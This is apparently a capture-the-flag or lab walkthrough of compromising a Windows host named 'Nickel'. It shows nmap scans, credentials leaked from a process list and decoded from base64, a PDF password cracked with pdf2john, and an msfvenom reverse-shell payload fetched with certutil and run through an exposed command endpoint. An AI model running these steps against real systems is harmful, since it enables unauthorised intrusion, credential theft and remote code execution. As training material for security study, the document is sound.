```sh
nmap -sC -sV -Pn -oA nickel 192.168.184.99
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 19:12 CST
Nmap scan report for 192.168.184.99
Host is up (0.047s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8684fdd5432705cfa7f2e9e27570d5f3 (RSA)
|   256 9c93cf48a94e70f460dee1a9c2c0b6ff (ECDSA)
|_  256 004ed73b0f9fe3744d04990bb18bdea5 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-01-29T01:14:21+00:00; +18s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2023-01-29T01:13:08+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2023-01-28T01:11:29
|_Not valid after:  2023-07-30T01:11:29
8089/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_clock-skew: mean: 13s, deviation: 5s, median: 9s
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.28 seconds

nmap -sC -sV -Pn -p- 192.168.184.99                                         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 12:01 CST
Nmap scan report for nickel (192.168.184.99)
Host is up (0.044s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8684fdd5432705cfa7f2e9e27570d5f3 (RSA)
|   256 9c93cf48a94e70f460dee1a9c2c0b6ff (ECDSA)
|_  256 004ed73b0f9fe3744d04990bb18bdea5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-01-29T18:06:45+00:00; +1m08s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2023-01-29T18:05:34+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2023-01-28T01:11:29
|_Not valid after:  2023-07-30T01:11:29
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m03s, deviation: 3s, median: 1m01s
| smb2-time: 
|   date: 2023-01-29T18:05:35
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 241.25 seconds

```

FTP is running:
`FileZilla Server 0.9.60 beta`

SMB will not connect

Port 8089
```html
<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.109.39:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.109.39:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.109.39:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
```

Checking out these it seems that we cannot get any of them, one gives a response however /GET fails.

Created a CURL POST request.

```sh
curl 'http://192.168.184.99:33333/list-running-procs' -X POST -H "Content-Length: 0"
```

Recieved a list of processes running.
```sh
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

```

This one is interesting. It has base64 encoded.

Decoded and found this.
`ariah`
`NowiseSloopTheory139`
Located file in FTP folder on C drive.
Infrastructure.pdf.
Downloaded using SCP.
Used pdf2john to crack.
Cracked password
`ariah4168`

```
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```
Generate shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.122 LPORT=80 -f exe > shell.exe
```
Download shell
```
certutil.exe -urlcache -split -f "http://192.168.49.122/shell.exe"
```
Testing
```
curl http://localhost/?cmd%20%2Fc%20dir%20c%3A%5Cusers%5Cariah%5C
```
Run
```
curl http://localhost/?cmd%20/c%20C:%5CUsers%5Cariah%5Cshell.exe
```